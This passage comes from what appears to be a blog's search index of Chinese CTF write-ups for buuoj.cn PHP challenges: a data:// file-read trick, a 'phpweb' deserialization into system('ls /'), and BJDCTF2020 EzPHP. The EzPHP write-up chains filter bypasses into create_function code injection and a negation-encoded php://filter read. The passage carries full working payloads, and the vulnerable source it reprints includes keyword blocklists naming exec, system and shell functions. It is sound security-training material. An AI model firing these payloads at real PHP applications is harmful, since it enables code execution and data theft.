</span><br><span class=\"line\">    $re = <span class=\"string\">''</span>; </span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class=\"line\">        $re .= chr ( ord ($v[$i]) + $i*<span class=\"number\">2</span> ); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">return</span> $re; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'Local access only!'</span>.<span class=\"string\">\"&lt;br/&gt;\"</span>;</span><br><span class=\"line\">$ip = getIp();</span><br><span class=\"line\"><span class=\"keyword\">if</span>($ip!=<span class=\"string\">'127.0.0.1'</span>)</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"Sorry,you don't have permission!  Your ip is :\"</span>.$ip;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($ip === <span class=\"string\">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class=\"string\">'2333'</span>]) === <span class=\"string\">'todat is a happy day'</span> )&#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"Your REQUEST is:\"</span>.change($_GET[<span class=\"string\">'file'</span>]);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> file_get_contents(change($_GET[<span class=\"string\">'file'</span>])); &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>看最后一个if，$ip===127.0.0.1刚已经用client-ip满足条件，file_get_content使用伪协议<code>2333=data:text/plain,todat is a happy day</code><br>满足if之后就会打印出get传入file指名文件的内容。<br>我们的目的是读取flag.php，但file名经过了change函数处理，把flag.php处理成乱码字符<br><img src=\"https://img-blog.csdnimg.cn/2020061210515899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>那么反过来，让传入的字符串经过change之后变成flag.php即可</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">change</span><span class=\"params\">($v)</span></span>&#123; </span><br><span class=\"line\"></span><br><span class=\"line\">    $re = <span class=\"string\">''</span>; </span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class=\"line\">        $re .= chr ( ord ($v[$i]) - $i*<span class=\"number\">2</span> ); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">return</span> $re; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$v = <span class=\"string\">'flag.php'</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> base64_encode(change($v));</span><br><span class=\"line\"><span class=\"comment\">//ZmpdYSZmXGI=</span></span><br></pre></td></tr></table></figure>\n<p>最终payload</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">?<span class=\"number\">2333</span>=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</span><br></pre></td></tr></table></figure>\n<p>传入即可<br><img src=\"https://img-blog.csdnimg.cn/20200612110219370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["代码审计"]},{"title":"网鼎杯2020朱雀组——phpweb","url":"/2020/06/07/buu15%E2%80%94%E2%80%94%5Bwangdingbei%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5Dphpweb/","content":"<p>平台 ：buuoj.cn<br>打开靶机一张众生皆懒狗(拜)<br>观察到会自动刷新时间，截个包<br><img src=\"https://img-blog.csdnimg.cn/20200607112651183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>func调用函数p作为参数，那么代码执行<br><img src=\"https://img-blog.csdnimg.cn/20200607112849760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>index.php如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">   $disable_fun = <span class=\"keyword\">array</span>(<span class=\"string\">\"exec\"</span>,<span class=\"string\">\"shell_exec\"</span>,<span class=\"string\">\"system\"</span>,<span class=\"string\">\"passthru\"</span>,<span class=\"string\">\"proc_open\"</span>,<span class=\"string\">\"show_source\"</span>,<span class=\"string\">\"phpinfo\"</span>,<span class=\"string\">\"popen\"</span>,<span class=\"string\">\"dl\"</span>,<span class=\"string\">\"eval\"</span>,<span class=\"string\">\"proc_terminate\"</span>,<span class=\"string\">\"touch\"</span>,<span class=\"string\">\"escapeshellcmd\"</span>,<span class=\"string\">\"escapeshellarg\"</span>,<span class=\"string\">\"assert\"</span>,<span class=\"string\">\"substr_replace\"</span>,<span class=\"string\">\"call_user_func_array\"</span>,<span class=\"string\">\"call_user_func\"</span>,<span class=\"string\">\"array_filter\"</span>, <span class=\"string\">\"array_walk\"</span>,  <span class=\"string\">\"array_map\"</span>,<span class=\"string\">\"registregister_shutdown_function\"</span>,<span class=\"string\">\"register_tick_function\"</span>,<span class=\"string\">\"filter_var\"</span>, <span class=\"string\">\"filter_var_array\"</span>, <span class=\"string\">\"uasort\"</span>, <span class=\"string\">\"uksort\"</span>, <span class=\"string\">\"array_reduce\"</span>,<span class=\"string\">\"array_walk\"</span>, <span class=\"string\">\"array_walk_recursive\"</span>,<span class=\"string\">\"pcntl_exec\"</span>,<span class=\"string\">\"fopen\"</span>,<span class=\"string\">\"fwrite\"</span>,<span class=\"string\">\"file_put_contents\"</span>);</span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">gettime</span><span class=\"params\">($func, $p)</span> </span>&#123;</span><br><span class=\"line\">       $result = call_user_func($func, $p);</span><br><span class=\"line\">       $a= gettype($result);</span><br><span class=\"line\">       <span class=\"keyword\">if</span> ($a == <span class=\"string\">\"string\"</span>) &#123;</span><br><span class=\"line\">           <span class=\"keyword\">return</span> $result;</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> &#123;<span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>;&#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span> </span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">var</span> $p = <span class=\"string\">\"Y-m-d h:i:s a\"</span>;</span><br><span class=\"line\">       <span class=\"keyword\">var</span> $func = <span class=\"string\">\"date\"</span>;</span><br><span class=\"line\">       <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">           <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;func != <span class=\"string\">\"\"</span>) &#123;</span><br><span class=\"line\">               <span class=\"keyword\">echo</span> gettime(<span class=\"keyword\">$this</span>-&gt;func, <span class=\"keyword\">$this</span>-&gt;p);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   $func = $_REQUEST[<span class=\"string\">\"func\"</span>];</span><br><span class=\"line\">   $p = $_REQUEST[<span class=\"string\">\"p\"</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">if</span> ($func != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">       $func = strtolower($func);</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class=\"line\">           <span class=\"keyword\">echo</span> gettime($func, $p);</span><br><span class=\"line\">       &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"keyword\">die</span>(<span class=\"string\">\"Hacker...\"</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>$disable_fun过滤了一大堆函数。<br>注意到test类中有__destruct魔法函数，直接用系统命令读文件，构造反序列化尝试</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $p = <span class=\"string\">\"ls /\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $func = <span class=\"string\">\"system\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> Test();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>\n<p>func反序列化，p字符串执行</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200607114343894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><code>find / -name &quot;flag*&quot;</code>找一下flag位置<br><img src=\"https://img-blog.csdnimg.cn/2020060711523933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>发现/tmp/flagoefiu4r93，读取即可<br><img src=\"https://img-blog.csdnimg.cn/20200607115427924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["serialize","代码审计"]},{"title":"BJDCTF2020——EzPHP","url":"/2020/06/30/buu18%E2%80%94%E2%80%94%5BBJDCTF2020%5DEzPHP/","content":"<p>本地复现一下<br>复现地址：<a href=\"https://github.com/BjdsecCA/BJDCTF2020_January\" target=\"_blank\" rel=\"noopener\">https://github.com/BjdsecCA/BJDCTF2020_January</a><br>打开靶机来自卡巴斯基网络威胁实时地图，控制台查看源码发现base32，解码得1nD3x.php<br><img src=\"https://img-blog.csdnimg.cn/20200630103318121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>访问得源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>); </span><br><span class=\"line\"></span><br><span class=\"line\">$file = <span class=\"string\">\"1nD3x.php\"</span>;</span><br><span class=\"line\">$shana = $_GET[<span class=\"string\">'shana'</span>];</span><br><span class=\"line\">$passwd = $_GET[<span class=\"string\">'passwd'</span>];</span><br><span class=\"line\">$arg = <span class=\"string\">''</span>;</span><br><span class=\"line\">$code = <span class=\"string\">''</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SERVER) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (</span><br><span class=\"line\">        preg_match(<span class=\"string\">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i'</span>, $_SERVER[<span class=\"string\">'QUERY_STRING'</span>])</span><br><span class=\"line\">        )  </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'You seem to want to do something bad?'</span>); </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!preg_match(<span class=\"string\">'/http|https/i'</span>, $_GET[<span class=\"string\">'file'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/^aqua_is_cute$/'</span>, $_GET[<span class=\"string\">'debu'</span>]) &amp;&amp; $_GET[<span class=\"string\">'debu'</span>] !== <span class=\"string\">'aqua_is_cute'</span>) &#123; </span><br><span class=\"line\">        $file = $_GET[<span class=\"string\">\"file\"</span>]; </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Neeeeee! Good Job!&lt;br&gt;\"</span>;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">die</span>(<span class=\"string\">'fxck you! What do you want to do ?!'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_REQUEST) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">foreach</span>($_REQUEST <span class=\"keyword\">as</span> $value) &#123; </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'fxck you! I hate English!'</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (file_get_contents($file) !== <span class=\"string\">'debu_debu_aqua'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class=\"line\">    extract($_GET[<span class=\"string\">\"flag\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Very good! you know my password. But what is flag?&lt;br&gt;\"</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"fxck you! you don't know my password! And you don't know sha1! why you come here!\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class=\"line\">preg_match(<span class=\"string\">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i'</span>, $arg) ) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"</span>); </span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\">    $code(<span class=\"string\">''</span>, $arg); </span><br><span class=\"line\">&#125; <span class=\"meta\">?&gt;</span></span><br><span class=\"line\">This is a very simple challenge <span class=\"keyword\">and</span> <span class=\"keyword\">if</span> you solve it I will give you a flag. Good Luck!</span><br><span class=\"line\">fxck you! I hate English!</span><br></pre></td></tr></table></figure>\n<p>有很多匹配和过滤，一层层看</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_SERVER) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (</span><br><span class=\"line\">        preg_match(<span class=\"string\">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i'</span>, $_SERVER[<span class=\"string\">'QUERY_STRING'</span>])</span><br><span class=\"line\">        )  </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'You seem to want to do something bad?'</span>); </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>匹配了很多必需的关键词，但可以对传入的字符串的进行url编码绕过，因为<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>并不会对字符串url解码，但get传入之后是会解码的，所以可行。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!preg_match(<span class=\"string\">'/http|https/i'</span>, $_GET[<span class=\"string\">'file'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/^aqua_is_cute$/'</span>, $_GET[<span class=\"string\">'debu'</span>]) &amp;&amp; $_GET[<span class=\"string\">'debu'</span>] !== <span class=\"string\">'aqua_is_cute'</span>) &#123; </span><br><span class=\"line\">        $file = $_GET[<span class=\"string\">\"file\"</span>]; </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Neeeeee! Good Job!&lt;br&gt;\"</span>;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">die</span>(<span class=\"string\">'fxck you! What do you want to do ?!'</span>);</span><br></pre></td></tr></table></figure>\n<p>禁用http/https协议，第二个if要求<code>debu=aqua_is_cute</code>但又匹配了<code>aqua_is_cute</code>，由于<code>preg_match</code>只匹配第一行，在句尾加上%0a即可绕过<br><img src=\"https://img-blog.csdnimg.cn/20200630105739618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_REQUEST) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">foreach</span>($_REQUEST <span class=\"keyword\">as</span> $value) &#123; </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'fxck you! I hate English!'</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>遍历<code>$_REQUEST</code>传递给<code>$value</code>，匹配<code>$value</code>中的大小写字母，这里考察了<code>$_REQUEST</code>的优先级特性，<code>$_REQUEST</code>同时接受GET和POST的数据，并且POST具有更高的优先值，php的配置文件中做出了说明。<br><img src=\"https://img-blog.csdnimg.cn/20200630110638839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>再post一个debu即可绕过。<br><img src=\"https://img-blog.csdnimg.cn/20200630111805511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (file_get_contents($file) !== <span class=\"string\">'debu_debu_aqua'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;\"</span>);</span><br></pre></td></tr></table></figure>\n<p>file_get_contents函数，用data协议写入绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class=\"line\">    extract($_GET[<span class=\"string\">\"flag\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Very good! you know my password. But what is flag?&lt;br&gt;\"</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"fxck you! you don't know my password! And you don't know sha1! why you come here!\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>要求<code>$shana</code>和<code>$passwd</code>的sha1相等但他们本身不相等，sha1()函数是无法处理数组的，如果sha1()的参数为一个数组会报Warning并返回False，因此如果<code>$shana</code>和<code>$passwd</code>都为数组，都返回false，就满足条件了.<br>把目前的payloaod整理一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">get：data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute</span><br><span class=\"line\">&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2</span><br><span class=\"line\">post：file&#x3D;1&amp;debu&#x3D;1</span><br></pre></td></tr></table></figure>\n<p>url编码传入测试<br><img src=\"https://img-blog.csdnimg.cn/2020063014542772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>那么接着看</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class=\"line\">preg_match(<span class=\"string\">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i'</span>, $arg) ) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"</span>); </span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\">    $code(<span class=\"string\">''</span>, $arg); </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>匹配了很多关键字和函数，但<code>$code</code>和<code>$arg</code>都可控，可以利用<code>$code(&#39;&#39;, $arg);</code>进行create_function注入<br>构造<code>flag[code]=create_function&amp;flag[arg]=}代码函数;//</code><br>这样就是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">a</span><span class=\"params\">(<span class=\"string\">''</span>,$arg)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> $arg</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而<code>$arg</code>为<code>}代码函数;//</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">a</span><span class=\"params\">(<span class=\"string\">''</span>,$arg)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> &#125;代码函数;<span class=\"comment\">//</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>}</code>提前闭合了a()，后面注释把后面的内容又去掉了，因此可以在<code>}</code>和<code>；</code>中间执行恶意代码<br>那么现在考虑得flag.php</p>\n<blockquote>\n<p>get_defined_vars()用来输出所有变量和值</p>\n</blockquote>\n<p>构造<code>flag[arg]=}var_dump(get_defined_vars());//&amp;flag[code]=create_function</code><br>同样base64编码传入测试<br><code>?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=}%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//</code><br><img src=\"https://img-blog.csdnimg.cn/20200630142425306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>得知真正的flag在rea1fl4g.php<br>那么现在就是读取这个文件了<br><code>require</code>代替被过滤的<code>include</code>，<code>require()</code>代替<code>require &quot;&quot;</code>，所以可以这样构造<br><code>require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</code><br>同样url编码后传入<br>由于关键字过滤，我们取反绕过，于是<br><code>require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))</code><br>传入<br><img src=\"https://img-blog.csdnimg.cn/20200630144125316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>解码得真的flag<br><img src=\"https://img-blog.csdnimg.cn/20200630144205341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","categories":["buu刷题"],"tags":["代码审计"]},{"title":"安洵杯2019——easy_serialize_php","url":"/2020/06/05/buu13%E2%80%94%E2%80%94%5Banxunbei%202019%5Deasy_serialize_php/","content":"<p>平台： buuoj.cn<br>打开靶机得源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$function = @$_GET[<span class=\"string\">'f'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($img)</span></span>&#123;</span><br><span class=\"line\">    $filter_arr = <span class=\"keyword\">array</span>(<span class=\"string\">'php'</span>,<span class=\"string\">'flag'</span>,<span class=\"string\">'php5'</span>,<span class=\"string\">'php4'</span>,<span class=\"string\">'fl1g'</span>);</span><br><span class=\"line\">    $filter = <span class=\"string\">'/'</span>.implode(<span class=\"string\">'|'</span>,$filter_arr).<span class=\"string\">'/i'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> preg_replace($filter,<span class=\"string\">''</span>,$img);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unset</span>($_SESSION);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$_SESSION[<span class=\"string\">\"user\"</span>] = <span class=\"string\">'guest'</span>;</span><br><span class=\"line\">$_SESSION[<span class=\"string\">'function'</span>] = $function;</span><br><span class=\"line\"></span><br><span class=\"line\">extract($_POST);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!$function)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;a 